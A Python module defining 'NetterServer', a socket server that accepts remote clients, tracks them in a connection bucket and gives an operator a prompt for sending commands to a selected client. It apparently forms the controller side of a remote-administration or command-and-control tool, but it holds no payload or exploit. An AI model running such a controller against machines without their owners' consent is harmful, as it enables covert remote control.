import socket, loguru, os
from .device import ClientDevice, ClientWrapper
from .bucket import ConnectionBucket
from .handler import ClientHandler
from .command import Command

class NetterServer(socket.socket):
    def __init__(self, connectionBucket: ConnectionBucket, _bind_address: tuple[str, int], commandHandler: Command | None = None, _backlog: int = 10) -> None:
        super().__init__(socket.AF_INET, socket.SOCK_STREAM)
        super().bind(_bind_address); super().listen(_backlog)

        self.connectionBucket: ConnectionBucket = connectionBucket
        self.commandHandler: Command | None = commandHandler

        self._selectedClient: ClientDevice | None = None
        self._waitingForResponse: bool = False
        self.isRunning: bool = True

    def close_server(self) -> None:
        for client in self.connectionBucket.connectionList:
            client.socket.connection.close()

        loguru.logger.info('Exitting server..')
        self.isRunning = False
        self.close()

    def controller(self) -> None:
        while True:
            input_prompt: str = '$ ' if not self._selectedClient else f'{self._selectedClient.clientUniqueID} $ '
            try:
                command: str = input(input_prompt)

            except EOFError:
                self.close_server()
                break

            if (command):

                if (command in ['exit', 'quit']):
                    if (not self._selectedClient):
                        self.close_server()
                        break

                    self._selectedClient = None
                    continue

                if (self.commandHandler is not None):
                    self.commandHandler.handle_command(command)

                else:
                    loguru.logger.error('Command Handler is not initialized yet')

        os._exit(0)

    def accept(self) -> ClientDevice | None:
        connection, connectionAddress = super().accept()
        Client: ClientWrapper = ClientWrapper(connection, connectionAddress)

        device = ClientDevice(client_data = Client.receive_packet(), connectionBucket = self.connectionBucket, socketInstance = Client)

        if ('_joined' in device.__dict__.keys()):
            ClientHandler(device,
                connectionAddress = connectionAddress,
                connectionBucket = self.connectionBucket,
                NetterInstance = self
            ).start()

            return device

        return None
